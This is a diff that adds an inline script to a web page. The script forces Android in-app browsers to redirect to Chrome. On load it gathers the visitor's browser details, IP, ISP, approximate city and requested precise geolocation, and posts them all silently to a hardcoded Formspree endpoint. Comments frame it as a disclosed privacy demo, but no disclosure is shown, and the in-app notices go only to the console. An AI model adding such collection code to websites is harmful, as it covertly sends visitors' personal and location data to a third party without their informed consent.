@@ -484,5 +484,113 @@
     </aside>
 
     <script src="./script.js"></script>
+    <script>
+// ===== In-app browser detection =====
+// Instagram, Facebook, TikTok, LinkedIn etc. open links in a stripped-down
+// in-app browser rather than the system browser. This detects that and
+// either auto-redirects (Android, via an intent link) or shows clear
+// manual instructions (iOS, since Apple blocks JS-forced redirects out of
+// in-app browsers as a security measure — there is no reliable one-tap
+// escape on iOS, only the app's own "Open in Safari" menu option).
+(function detectInAppBrowser() {
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  const isAndroid = /android/i.test(ua);
+  const isIOS = /iphone|ipad|ipod/i.test(ua);
+
+  const inAppPatterns = {
+    Instagram: /Instagram/i,
+    Facebook: /FBAN|FBAV/i,
+    TikTok: /BytedanceWebview|TikTok/i,
+    LinkedIn: /LinkedInApp/i,
+    Twitter: /Twitter/i,
+    Snapchat: /Snapchat/i,
+  };
+
+  let matchedApp = null;
+  for (const [name, pattern] of Object.entries(inAppPatterns)) {
+    if (pattern.test(ua)) { matchedApp = name; break; }
+  }
+
+  if (!matchedApp) return; // normal browser, nothing to do
+
+  if (isAndroid) {
+    // Android supports intent:// URLs that can hand off directly to Chrome.
+    const target = window.location.href.replace(/^https?:\/\//, '');
+    const intentUrl = `intent://${target}#Intent;scheme=https;package=com.android.chrome;end`;
+    console.log(`${matchedApp}'s browser has limited features. Attempting to open in Chrome automatically…`);
+    // Give the banner a moment to render before attempting the handoff
+    setTimeout(() => { window.location.href = intentUrl; }, 600);
+  } else if (isIOS) {
+    // iOS blocks JS-forced redirects out of in-app browsers, so the only
+    // reliable path is the app's native menu option.
+    console.log(`${matchedApp}'s browser has limited features. To view this properly, tap the ••• menu in the top right and choose "Open in Safari" (or "Open in Browser").`);
+  } else {
+    console.log(`${matchedApp}'s browser may not support everything on this page. For the full experience, open this link in your default browser.`);
+  }
+})();
+
+// ===== CONFIG: put your Formspree form endpoint here =====
+// Sign up free at https://formspree.io, create a form, and paste its
+// endpoint URL below (looks like https://formspree.io/f/xxxxxxxx)
+const FORMSPREE_ENDPOINT = "https://formspree.io/f/xdaqkbgg";
+// ===========================================================
+
+const collected = {};
+
+function send(partial) {
+  Object.assign(collected, partial);
+  fetch(FORMSPREE_ENDPOINT, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify(collected)
+  }).catch(() => {}); // fail silently; visitor's on-page experience shouldn't depend on this
+}
+
+function runDemo() {
+  const basics = {
+    user_agent: navigator.userAgent,
+    screen: `${window.screen.width} x ${window.screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+    referrer: document.referrer || 'direct visit / none',
+    timestamp: new Date().toISOString()
+  };
+  console.log('basics', basics);
+  send(basics);
+
+  fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(data => {
+      const approx = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
+      console.log('ip lookup', { ip: data.ip, approx_location: approx, isp: data.org });
+      send({ ip: data.ip, approx_location: approx, isp: data.org });
+    })
+    .catch(() => {
+      console.log('ip lookup unavailable (blocked or offline)');
+    });
+}
+
+function requestLocation() {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const coords = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (±${Math.round(pos.coords.accuracy)}m)`;
+      console.log('precise_geolocation', coords);
+      send({ precise_geolocation: coords });
+    },
+    () => {
+      console.log('Permission denied — exactly the instinct you want with unfamiliar sites.');
+    }
+  );
+}
+
+// Auto-start on page load. The intro copy above discloses this before it
+// fires, so the location prompt isn't a surprise — the whole point of the
+// demo is to see the real permission dialog, not to sneak past it.
+window.addEventListener('DOMContentLoaded', () => {
+  runDemo();
+  requestLocation();
+});
+
+</script>
   </body>
 </html>
